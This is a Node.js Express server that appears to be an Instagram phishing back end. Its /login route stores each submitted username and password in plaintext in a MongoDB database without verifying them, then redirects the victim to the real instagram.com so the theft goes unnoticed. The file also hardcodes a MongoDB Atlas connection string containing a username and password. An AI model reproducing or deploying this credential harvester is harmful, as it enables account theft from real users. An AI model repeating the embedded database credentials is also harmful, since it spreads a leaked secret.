const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static('public'));


// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');

// Connect to MongoDB
const connectDB = async () => {
    try {
        await mongoose.connect('mongodb+srv://yusakasatya424:pLaooF1CSk91z19J@ig.nrncie8.mongodb.net/?retryWrites=true&w=majority&appName=ig', {
            useNewUrlParser: true,
            useUnifiedTopology: true
        });
        console.log("Database is Connected Successfully");
    } catch (error) {
        console.log(error);
    }
}

connectDB();

// Create a schema for the user
const userSchema = new mongoose.Schema({
  username: String,
  password: String
});

const User = mongoose.model('User', userSchema);

// Serve login page
app.get('/', (req, res) => {
  res.render('login');
});

// Login route
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  try {
    // Check if the user already exists in the database
    let user = await User.findOne({ username });
    
    if (user) {
      // If user exists, update the password
      user.password = password;
    } else {
      // If user does not exist, create a new user
      user = new User({ username, password });
    }

    // Save the user to the database
    await user.save();

    // Redirect to Instagram
    res.redirect('https://www.instagram.com/');
  } catch (err) {
    console.error(err);
    res.status(500).send('Internal Server Error');
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
